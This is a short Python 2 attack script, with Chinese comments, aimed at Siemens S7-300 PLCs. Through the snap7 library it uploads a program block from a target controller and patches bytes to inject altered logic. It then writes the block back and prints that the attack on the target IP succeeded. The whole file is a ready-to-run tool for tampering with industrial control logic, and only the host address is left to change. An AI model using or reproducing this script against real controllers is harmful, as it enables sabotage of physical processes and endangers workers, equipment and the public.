# -*- coding:utf-8 -*-
'''
该脚本支持针对S7-300进行逻辑提取，并进行逻辑修改
重新将新的逻辑下载进去
'''
import json
import socket   #for sockets
import SOAPpy
import snap7
from snap7.snap7exceptions import Snap7Exception
from snap7.snap7types import S7AreaDB, S7WLByte, S7DataItem
from snap7 import util
def Atks7300(targetIP):
    print u'****s7-300修改逻辑****'
    ip = targetIP
    tcpport = 1027
    db_number = 1
    rack = 0
    slot = 2
    #提取出逻辑文件
    s7client = snap7.client.Client()
    s7client.connect(ip, rack, slot, tcpport)
    print 'connect s7-300'
    rec = s7client.full_upload('OB',db_number)
    #对逻辑文件进行修改
    senddata=rec[0][0:rec[0][11]]
    senddata[11] = senddata[11]+2
    senddata[35] = senddata[35]+2
    senddata[74] = senddata[74]+2

    equalindex = senddata.index('\x41')
    senddata.insert(equalindex,'\x2D')
    senddata.insert(equalindex,'\x68')

    print ' '.join(["%x" %(x) for x in rec[0]])
    print ' '.join(["%x" %(x) for x in senddata])
    #重新将逻辑文件下载到控制器中
    s7client.download(senddata,db_number)
    print "db download ok"
    s7client.disconnect()
    s7client.destroy()
    print 'end'

    print u"XXIP:"+targetIP+u"成功！"


if __name__ == '__main__':
    host = '127.0.0.1'          #根据需要可以自行修改
    Atks7300(host)
